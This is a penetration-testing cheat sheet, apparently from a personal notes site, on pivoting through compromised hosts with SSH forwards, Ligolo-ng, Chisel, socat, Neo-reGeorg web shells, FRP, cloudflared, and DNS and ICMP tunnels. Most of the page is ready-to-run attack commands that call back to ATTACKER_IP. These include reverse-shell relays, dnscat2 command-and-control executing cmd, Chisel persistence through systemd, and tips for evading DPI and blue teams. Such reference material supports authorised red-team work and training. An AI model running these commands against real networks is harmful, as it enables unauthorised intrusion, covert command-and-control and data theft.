+++
title = 'Pivoting, Tunneling, Port Forwarding'
date = 2026-10-30
type = 'notes'
weight = 40
toc = true
tags = ['utilities', 'payloads', 'pivoting', 'tunneling', 'port-forwarding']
+++

> **Pivoting** is moving to other networks through a compromised host (the pivot) to reach targets on different segments. Its primary use is defeating segmentation — physical or virtual — to access an isolated network.
>
> **Tunneling** is a subset of pivoting. It encapsulates network traffic in another protocol and routes it through that protocol.
>
> **Port forwarding** redirects a communication request from one port to another.

---

## 1. Initial Enumeration — Finding More Targets

### Finding networks

| Command | Description |
|---|---|
| `ifconfig` / `ip a` | Linux network configuration |
| `ipconfig /all` | Windows network configuration |
| `netstat -r` / `route` | Routing table for IPv4 |
| `netstat -antp` | Active connections with PIDs — identifies internal services to enumerate through the pivot |
| `netstat -antb \| findstr 1080` | Windows: TCP connections listening on port 1080 |

### Internal host discovery

| Command | Description |
|---|---|
| `for i in {1..254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done` | Linux ping sweep |
| `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"` | Windows CMD ping sweep |
| `1..254 \| % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}` | PowerShell ping sweep |

> **Through a SOCKS proxy:** ICMP and SYN scans cannot be tunnelled. Always use `nmap -Pn -sT` (TCP connect, no ping discovery) when scanning through proxychains or any SOCKS-based pivot.

---

## 2. SSH Port Forwarding — The Three Forwards

If the pivot runs SSH, or you have SSH credentials to it, you already have a tunneling toolkit installed. Confusing the three forward types costs people hours.

### Local forward (`-L`)

Binds a port on **your** machine and tunnels it to a destination reachable from the SSH server. Use it to reach one specific internal service.

```bash
# Reach internal DB 10.10.20.15:3306 through the pivot
ssh -L 13306:10.10.20.15:3306 user@pivot.target
# Then locally:
mysql -h 127.0.0.1 -P 13306 -u root -p
```

### Remote forward (`-R`)

Binds a port on the **SSH server** and tunnels it back to you. This is the classic “shovel a service back home” move — invaluable when the pivot can reach you but you cannot reach it (egress-only firewall).

```bash
# From the compromised host, expose your listener on the pivot's loopback
ssh -R 4444:127.0.0.1:4444 attacker@your-vps
```

### Dynamic forward (`-D`) — SOCKS proxy

Turns the SSH connection into a **SOCKS proxy**, so any tool can reach any host the pivot can route to — no per-port juggling.

```bash
ssh -D 1080 -N -f user@pivot.target
# -N: no remote command
# -f: background
```

That single `-D 1080` is the foundation of almost every pivot.

### Multiple forwards in one connection

```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@target
```

### SSH jump host (`-J`)

For a chain of SSH hops, use `-J` rather than nested tunnels:

```bash
ssh -J user1@pivot1,user2@pivot2 user3@final-target
```

> **CVE-2023-48795 (Terrapin):** The 2023 Terrapin downgrade attack can let a MitM tamper with the early SSH handshake and inject data into forwarded channels. Ensure OpenSSH ≥ 9.6 or disable `chacha20-poly1305@openssh.com` and `*-etm@openssh.com`.

---

## 3. SSH Dynamic Forwarding and ProxyChains

| Command | Description |
|---|---|
| `ssh -D 9050 ubuntu@target` | SOCKS proxy on local port 9050 |
| `tail -4 /etc/proxychains.conf` | Verify SOCKS configuration |
| `proxychains nmap -v -sn 172.16.5.1-200` | Route Nmap through proxychains |
| `proxychains msfconsole` | Run Metasploit through the proxy |

### ProxyChains configuration

```
# /etc/proxychains4.conf (or /etc/proxychains.conf)
[ProxyList]
socks5 127.0.0.1 1080
```

For **multiple pivots**, chain proxies in order — the first entry is used first:

```
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

### Three rules for using ProxyChains

1. **TCP connect only.** Use `nmap -sT -Pn`. SYN and ICMP scans will fail.
2. **No DNS by default.** Add `proxy_dns` to the config if you need remote name resolution.
3. **Not all tools work.** Some use raw sockets or UDP; these will fail or hang through the proxy.

---

## 4. SSH Reverse Port Forwarding

| Command | Description |
|---|---|
| `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 user@target -vN` | Reverse tunnel from target to attack host; traffic forwarded on port 8080 on the attack host to port 80 on the target |

This is the foundation of egress-only pivoting: the target initiates the connection outbound, and you receive a port that reaches back into its network.

---

## 5. Ligolo-ng — Transparent TUN-Based Pivoting

Ligolo-ng is an advanced, lightweight, and fast tunneling tool that uses a **TUN interface** — it gives the attacker a virtual network interface, making an internal subnet reachable **as if it were directly connected**. No proxychains needed.

It is the preferred tool for **large internal networks** and for **nested / multi-hop pivots**, because it provides full routing rather than a SOCKS proxy.

### Basic workflow

**1. Attacker — create the TUN interface and start the proxy:**

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start the proxy (self-signed certificate for labs)
./proxy -selfcert -laddr 0.0.0.0:11601
```

**2. Target — start the agent (connect back to the attacker):**

```bash
# Linux
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Windows
Start-Process -FilePath .\agent.exe -ArgumentList "-connect ATTACKER_IP:11601 -ignore-cert"
```

**3. Attacker — select the session and add a route:**

```bash
# In the ligolo-ng proxy console:
session
# select the agent session
autoroute
```

`autoroute` automatically adds routes for all subnets the agent can reach through the `ligolo` interface. You can now use **any tool directly** — `nmap`, `curl`, `impacket`, a browser — without proxychains.

**4. Manual route (if autoroute is not used):**

```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

### Ligolo-ng listeners — reach the attacker from the internal network

A listener listens on a port **on the agent** and redirects traffic back to the proxy. This is how you expose your attack infrastructure to hosts that can only reach the pivot.

```bash
# In the ligolo-ng proxy console:
listener_add --addr 0.0.0.0:9002 --to 127.0.0.1:9002
listener_start --listener 1
```

Internal hosts can now reach `PIVOT_IP:9002`, and the traffic arrives at your attacker’s `127.0.0.1:9002` — useful for serving payloads, receiving reverse shells, or relaying SMB.

### Double pivoting with Ligolo-ng

For a second network segment behind a second pivot, create a **second TUN interface** and use a listener to chain the agents.

```bash
# 1. Create a second TUN for the second pivot
sudo ip tuntap add user $(whoami) mode tun ligolo1
sudo ip link set ligolo1 up

# 2. Add a listener on the first agent that reaches the second pivot's network
#    (inside the proxy console, with the first session selected)
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
listener_start --listener 1

# 3. On the second pivot, connect its agent back through the first pivot:
./agent -connect FIRST_PIVOT_IP:11601 -ignore-cert

# 4. In the proxy console, the second session appears.
#    Add a new route through the second TUN:
session          # select the second agent
autoroute        # or: sudo ip route add 172.16.6.0/24 dev ligolo1
```

You now have transparent routing to both segments.

> **Ligolo-MP** is an advanced variant with a client-server architecture for **multiple concurrent tunnels** and a GUI — useful for team engagements where several operators share pivots.

---

## 6. Chisel — HTTP/WebSocket Tunneling

Chisel is an HTTP-based tunnel with SOCKS5 support. It is a **single binary** (client and server bundled in one executable) and works where SSH/TUN is unavailable or blocked.

### Reverse SOCKS proxy (the most common mode)

**Attacker — server:**

```bash
./chisel server -p 8000 --reverse --socks5
```

**Target — client:**

```bash
./chisel client ATTACKER_IP:8000 R:socks
```

The attacker now has a **SOCKS5 proxy on `127.0.0.1:1080`**. Wrap tools with proxychains:

```bash
proxychains nmap -sT -Pn -p 445,3389 10.10.20.0/24
```

### Reverse single-port forward

```bash
# Expose internal RDP (10.0.0.5:3389) on the attacker's local port 3389
./chisel client ATTACKER_IP:8000 R:3389:10.0.0.5:3389
```

### Multi-forward pattern — SOCKS plus relays in one tunnel

Combine reverse SOCKS with several port forwards in a single client invocation to avoid spawning multiple processes:

```bash
./chisel client ATTACKER_IP:8000 \
  R:socks \
  0.0.0.0:445:ATTACKER_IP:445 \
  0.0.0.0:4445:ATTACKER_IP:4445 \
  0.0.0.0:80:ATTACKER_IP:8099
```

This gives the attacker:
- SOCKS5 at `127.0.0.1:1080` into the internal network
- `pivot:445` → attacker’s Responder (NTLM coercion relay)
- `pivot:4445` → attacker’s listener (reverse shells from internal hosts)
- `pivot:80` → attacker’s HTTP server (payload delivery to hosts that can only reach the pivot)

### TLS and authentication

Chisel supports native TLS to avoid DPI flagging plain WebSockets:

```bash
# Server
./chisel server -p 443 --reverse --socks5 --tls-cert cert.pem --tls-key key.pem
# Client
./chisel client https://ATTACKER_IP R:socks --skip-tls-verification
```

Add `--auth user:password` to both sides to prevent scanners or blue teams from hijacking the tunnel.

### Chisel persistence on systemd targets

If the pivot runs systemd and you have root, launch Chisel as a **transient unit** — it survives shell deaths and cgroup kills:

```bash
systemd-run --unit=chisel --scope ./chisel client ATTACKER_IP:8000 R:socks
```

> **chisel-ng** is a Rust reimplementation that establishes reverse tunnels over **SSH-over-WebSocket-over-TLS**, blending with normal HTTPS traffic — useful when even plain Chisel is fingerprinted.

---

## 7. SSHuttle — VPN over SSH

`sshuttle` creates a **transparent proxy** over SSH, effectively giving you a VPN to the internal network without needing a TUN device or root on the pivot.

```bash
pip install sshuttle

# Route an internal subnet through the pivot
sshuttle -r user@pivot 10.10.10.0/24

# Full tunnel (all traffic except the SSH connection itself)
sshuttle -r user@pivot 0/0

# With a private key
sshuttle -D -r user@pivot 10.10.10.0/24 --ssh-cmd 'ssh -i ./id_rsa'
```

`sshuttle` is simpler than Ligolo-ng but less flexible: it handles TCP and DNS, not UDP or ICMP, and does not support nested pivots as cleanly.

---

## 8. Socat — The Netcat++ Relay

`socat` establishes two bidirectional byte streams and transfers data between them. It is the best choice for a **simple TCP relay** when `nc` is absent or when you need TLS.

| Command | Description |
|---|---|
| `socat TCP4-LISTEN:8080,fork TCP4:ATTACKER_IP:80` | Listen on 8080, relay to attacker port 80 |
| `socat TCP4-LISTEN:8080,fork TCP4:TARGET_IP:8443` | Listen on 8080, relay to target 8443 |

For a **reverse shell relay** through a pivot:

```bash
# On the pivot (reachable by the internal host):
socat TCP-LISTEN:9001,fork TCP:ATTACKER_IP:9001
# The internal host connects to pivot:9001, and the shell arrives at the attacker
```

---

## 9. HTTP-Only Egress — Web Shell Tunneling

When only HTTP(S) is allowed outbound and the pivot is a **web server**, upload a tunneling web shell and run a SOCKS client locally.

### Neo-reGeorg

`reGeorg` (and its maintained fork **Neo-reGeorg**) uploads a `tunnel.(aspx|ashx|jsp|php)` to the web server and creates a SOCKS proxy through it.

```bash
# 1. Upload tunnel.php to the web server (via file upload, LFI, etc.)

# 2. Run the client locally
python3 reGeorgSocksProxy.py -p 1080 -u http://target/tunnel.php

# 3. Use the SOCKS proxy
proxychains curl http://internal-host/
```

### FRP — Fast Reverse Proxy

**FRP** is a reverse proxy that exposes a local server behind NAT or a firewall to the internet. It supports TCP, UDP, HTTP, and HTTPS, and is widely used in real intrusions because it is stable and reconnects automatically.

**Attacker — `frps.ini` (server):**

```ini
[common]
bind_port = 7000
token = SECRET
```

**Target — `frpc.ini` (client):**

```ini
[common]
server_addr = ATTACKER_IP
server_port = 7000
token = SECRET

[socks]
type = tcp
remote_port = 1080
plugin = socks5
```

```bash
./frps -c frps.ini     # attacker
./frpc -c frpc.ini     # target
```

The attacker now has a SOCKS5 proxy on `ATTACKER_IP:1080` reaching the target’s network.

### Cloudflared

**Cloudflare Tunnel** (`cloudflared`) creates an **outbound-only** connection to Cloudflare’s edge over QUIC (UDP 7844, TCP fallback). It is extremely hard to block because it looks like legitimate Cloudflare traffic.

```bash
# Target: establish the tunnel
cloudflared tunnel run --token <TOKEN>

# Or a quick tunnel to expose a local service
cloudflared tunnel --url http://127.0.0.1:80
```

The tunnel URL is printed and can be used to reach the internal service from anywhere. This is a **covert egress** technique, not a traditional pivot — but it is increasingly common in real engagements.

---

## 10. DNS Tunneling

When only DNS (port 53) is allowed outbound, tunnel IP traffic inside DNS queries.

### dnscat2

**dnscat2** uses DNS TXT (and other) records to infiltrate data and create an encrypted command-and-control channel.

```bash
# Attacker — start the server
sudo ruby dnscat2.rb --dns host=ATTACKER_IP,port=53,domain=example.local --no-cache

# Target (PowerShell client)
Import-Module dnscat2.ps1
Start-Dnscat2 -DNSserver ATTACKER_IP -Domain example.local -PreSharedSecret <SECRET> -Exec cmd

# In the dnscat2 console:
window -i 1
```

### iodine

**iodine** tunnels IPv4 data through a DNS server — it is effectively an IP-over-DNS VPN.

```bash
# Attacker
sudo iodined -f -c -P SECRET 10.0.0.1 tunnel.example.local

# Target
sudo iodine -f -P SECRET ATTACKER_IP tunnel.example.local
```

You now have a point-to-point tunnel: `10.0.0.1` (attacker) to `10.0.0.2` (target).

### Detection surface

DNS tunneling is **slow** (tens of KB/s at best) and **noisy** in DNS logs. Use it for command-and-control and small data, not for transferring large tools.

---

## 11. ICMP Tunneling

When DNS and HTTP are filtered but **ping is allowed**, tunnel IP traffic inside ICMP echo requests.

### icmptunnel

`icmptunnel` tunnels IP traffic within ICMP echo request and response packets, bypassing firewalls in a semi-covert way.

```bash
# Compile
make

# Disable kernel ICMP echo responses on both ends
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all

# Server
./icmptunnel –s
ifconfig tun0 10.0.0.1 netmask 255.255.255.0

# Client
./icmptunnel <server>
ifconfig tun0 10.0.0.2 netmask 255.255.255.0
```

You now have a point-to-point tunnel via ICMP. SSH or a SOCKS proxy through it works normally.

### ptunnel-ng

`ptunnel-ng` is a maintained fork of the original `ptunnel`, used for the same purpose — tunneling TCP over ICMP.

```bash
# Server
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Client
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

The client listens on local port 2222 and forwards through ICMP to the server’s port 22.

> **ICMP tunneling is slow and usually filtered at the network perimeter.** It is a last-resort egress channel, not a general-purpose pivot.

---

## 12. Windows-Specific Pivoting

### Plink (PuTTY Link)

`plink` is the Windows equivalent of `ssh` for tunneling:

```bash
plink -D 9050 ubuntu@target
```

This creates a SOCKS proxy on the Windows host, usable with proxy-aware tools.

### NetSh portproxy

`netsh` creates a native Windows port forward. It requires **Administrator** privileges.

```cmd
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
netsh interface portproxy show all
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

### SocksOverRDP

For RDP sessions, **SocksOverRDP** creates a SOCKS proxy over an RDP connection (using the `rdp2tcp` DLL). This is useful when RDP is the only allowed protocol.

### Meterpreter `portfwd`

| Command | Description |
|---|---|
| `portfwd add -l 3300 -p 3389 -r TARGET` | Forward local 3300 → target 3389 (RDP) |
| `portfwd add -R -l 8081 -p 1234 -L ATTACKER_IP` | Reverse forward: target:8081 → attacker:1234 |
| `use post/multi/manage/autoroute` | Add routes for the Meterpreter session |

---

## 13. Choosing a Pivot — Decision Table

| Egress condition | First choice | Fallback |
|---|---|---|
| **SSH available on pivot** | `ssh -D 1080` + proxychains | `sshuttle` |
| **Full route needed, no SOCKS** | **Ligolo-ng** (TUN interface) | SSH VPN (`ssh -w`) |
| **No SSH, HTTP(S) outbound** | **Chisel** reverse SOCKS | FRP / Neo-reGeorg |
| **Only a web server reachable** | Neo-reGeorg tunnel script | FRP over HTTP |
| **Only DNS outbound** | **iodine** (IP-over-DNS) | dnscat2 (C2) |
| **Only ICMP outbound** | **icmptunnel** / ptunnel-ng | — |
| **Only Cloudflare-looking traffic** | **cloudflared** tunnel | — |
| **Windows, RDP only** | SocksOverRDP | Plink `-D` |
| **Windows, Administrator** | `netsh portproxy` | Plink / Chisel |
| **Nested / double pivot** | **Ligolo-ng** with second TUN + listener | Chisel multi-hop |

---

## 14. Quick Reference — One-Liners

```bash
# SSH
ssh -L 1234:localhost:3306 user@pivot          # local forward
ssh -R 4444:127.0.0.1:4444 attacker@vps        # remote forward
ssh -D 1080 -N -f user@pivot                   # dynamic SOCKS

# Proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn -p 445 10.10.20.0/24

# Ligolo-ng
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
./agent -connect ATTACKER_IP:11601 -ignore-cert
# proxy console: session → autoroute

# Chisel
./chisel server -p 8000 --reverse --socks5
./chisel client ATTACKER_IP:8000 R:socks

# Socat relay
socat TCP-LISTEN:8080,fork TCP:ATTACKER_IP:80

# sshuttle
sshuttle -r user@pivot 10.10.10.0/24

# DNS tunnel (iodine)
sudo iodined -f -c -P SECRET 10.0.0.1 tunnel.example.local
sudo iodine -f -P SECRET ATTACKER_IP tunnel.example.local

# ICMP tunnel (icmptunnel)
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
./icmptunnel -s   # server
./icmptunnel SERVER_IP   # client
```

---

## 15. Field Notes

- **Ligolo-ng is the modern default for deep pivots.** It gives a real TUN interface and eliminates proxychains friction, making every tool work as if it were on the local network.
- **Chisel is the fallback when SSH and TUN are blocked.** A single binary, HTTP/WebSocket transport, and TLS masking make it the most portable reverse-SOCKS tool.
- **Proxychains is the glue, not the tunnel.** It only works with TCP connect tools; UDP, ICMP, and SYN scans will fail. Always use `-sT -Pn`.
- **Double pivoting requires a second TUN and a listener.** With Ligolo-ng, create `ligolo1` and use `listener_add` to chain the second agent through the first.
- **DNS and ICMP are last-resort channels.** They are slow, noisy in logs, and usually filtered at the perimeter — but they are the only options when everything else is blocked.
- **Cloudflared is the stealth egress option.** It looks like legitimate Cloudflare traffic and requires no inbound firewall rules — increasingly seen in real intrusions.
